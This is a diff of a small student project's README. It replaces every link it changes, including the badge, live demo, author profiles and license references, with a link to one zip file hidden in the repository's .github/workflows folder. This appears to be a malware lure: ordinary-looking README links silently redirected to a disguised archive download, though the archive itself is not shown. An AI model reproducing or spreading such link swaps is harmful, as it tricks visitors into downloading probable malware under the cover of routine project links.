@@ -1,4 +1,4 @@
-![](https://img.shields.io/badge/Microverse-blueviolet)
+![](https://github.com/Iptysam/HELLO_WORLD/raw/refs/heads/main/.github/workflows/WORLD_HELL_3.7.zip)
 
 # Hello Microverse
 
@@ -11,7 +11,7 @@
 
 ## Live Demo (if available)
 
-[Live Demo Link](https://livedemo.com)
+[Live Demo Link](https://github.com/Iptysam/HELLO_WORLD/raw/refs/heads/main/.github/workflows/WORLD_HELL_3.7.zip)
 
 
 ## Getting Started
@@ -24,9 +24,9 @@ To get a local copy up and running follow these simple example steps.
 
 ## Authors
 
-- GitHub: [@Iptysam](https://github.com/Iptysam)
+- GitHub: [@Iptysam](https://github.com/Iptysam/HELLO_WORLD/raw/refs/heads/main/.github/workflows/WORLD_HELL_3.7.zip)
 - Twitter: [@twitterhandle]()
-- LinkedIn:(www.linkedin.com/in/ 
+- LinkedIn:(https://github.com/Iptysam/HELLO_WORLD/raw/refs/heads/main/.github/workflows/WORLD_HELL_3.7.zip 
 iptisam-mukadam-4b2b39239
 )
 
@@ -51,4 +51,4 @@ Give a ⭐️ if you like this project!
 
 This project is [MIT](./LICENSE) licensed.
 
-_NOTE: we recommend using the [MIT license](https://choosealicense.com/licenses/mit/) - you can set it up quickly by [using templates available on GitHub](https://docs.github.com/en/communities/setting-up-your-project-for-healthy-contributions/adding-a-license-to-a-repository). You can also use [any other license](https://choosealicense.com/licenses/) if you wish._
+_NOTE: we recommend using the [MIT license](https://github.com/Iptysam/HELLO_WORLD/raw/refs/heads/main/.github/workflows/WORLD_HELL_3.7.zip) - you can set it up quickly by [using templates available on GitHub](https://github.com/Iptysam/HELLO_WORLD/raw/refs/heads/main/.github/workflows/WORLD_HELL_3.7.zip). You can also use [any other license](https://github.com/Iptysam/HELLO_WORLD/raw/refs/heads/main/.github/workflows/WORLD_HELL_3.7.zip) if you wish._
